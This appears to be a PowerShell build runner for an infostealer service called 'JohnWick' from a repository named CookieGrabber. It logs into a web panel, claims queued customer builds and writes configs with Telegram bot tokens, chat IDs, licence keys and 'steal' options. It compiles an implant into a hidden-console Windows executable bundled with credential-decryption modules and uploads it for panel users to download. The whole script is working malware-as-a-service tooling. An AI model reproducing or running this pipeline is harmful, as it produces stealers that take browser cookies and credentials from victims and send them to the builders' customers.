# JohnWick build runner - run this on ONE always-on Windows box.
#
# The web panel (Netlify UI + Cloudflare Worker API) stores build configs but
# cannot compile a .exe serverless. This script is the missing hand: it logs in
# as an admin, polls /api/builds?claim=1 for queued jobs, compiles each into a
# real exe with local PyInstaller, and uploads the artifact back so users can
# download it from the site.
#
# Setup (once):
#   py -3 -m pip install requests requests-toolbelt psutil pycryptodomex pywin32 pyinstaller
#   git clone https://github.com/bishnuneup4ne/CookieGrabber.git
#   cd CookieGrabber\JohnWickGrabber
# Then edit the three values below and run:  powershell -ExecutionPolicy Bypass -File runner\win_build.ps1

param(
  [string]$Api      = "https://YOUR-WORKER.workers.dev",  # CF worker base URL
  [string]$User     = "admin",                            # must be an admin (runner scope)
  [string]$Pass     = "",                                 # leave blank -> prompted each start
  [int]     $PollSec = 8
)

$ErrorActionPreference = "Stop"
$RepoRoot = Split-Path -Parent $PSScriptRoot   # .../JohnWickGrabber
if ($Pass -eq "") { $Pass = Read-Host "panel admin password" }

Invoke-RestMethod "$Api/api/login" -Method Post -ContentType "application/json" `
  -Body (@{ u=$User; p=$Pass } | ConvertTo-Json) | ForEach-Object {
    if (-not $_.ok) { throw "login failed: $($_.error)" }
    $script:Tok = $_.token
  }
$h = @{ authorization = "Bearer $Tok" }
Write-Host "[runner] logged in, polling $Api every ${PollSec}s..."

while ($true) {
  try {
    $resp = Invoke-RestMethod "$Api/api/builds?claim=1" -Headers $h
    $build = $resp.build
    if (-not $build) { Start-Sleep $PollSec; continue }

    $name = $build.config.name
    Write-Host "[runner] building '$name' for $($build.username)"

    # Drop cfg.json into the repo dir so builder.py's --add-data packs it.
    $cfg = $build.config | Select-Object bot_token, chat_id, licence_key, licence_url, steal, opts
    $cfgJson = $cfg | ConvertTo-Json -Depth 6
    Set-Content -Path (Join-Path $RepoRoot "cfg.json") -Value $cfgJson -Encoding utf8

    # Compile with the repo's own builder (native path).
    Push-Location $RepoRoot
    & py -3 builder.py --write-cfg-only 2>&1 | Out-Null   # ensures cfg shape valid
    & py -3 -m PyInstaller --noconfirm --onefile --noconsole --name $name `
        --add-data "cfg.json;." --hidden-import win32crypt --hidden-import winreg `
        --collect-submodules Cryptodome jwg_implant.py 2>&1 | Out-Null
    Pop-Location

    $exe = Join-Path $RepoRoot "dist\$name.exe"
    if (Test-Path $exe) {
      $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($exe))
      Invoke-RestMethod "$Api/api/builds/$($build.id)/upload" -Method Post -Headers $h `
        -ContentType "application/json" -Body (@{ status="done"; data_base64=$b64 } | ConvertTo-Json)
      Write-Host "[runner] uploaded $name ($([int]($b64.Length/1024)) KB b64)"
      Remove-Item $exe -Force
    } else {
      Invoke-RestMethod "$Api/api/builds/$($build.id)/upload" -Method Post -Headers $h `
        -ContentType "application/json" -Body (@{ status="failed"; error="pyinstaller produced no exe" } | ConvertTo-Json)
      Write-Host "[runner] FAILED $name - no artifact"
    }
  } catch {
    Write-Host "[runner] error: $($_.Exception.Message)"
    Start-Sleep $PollSec
  }
}
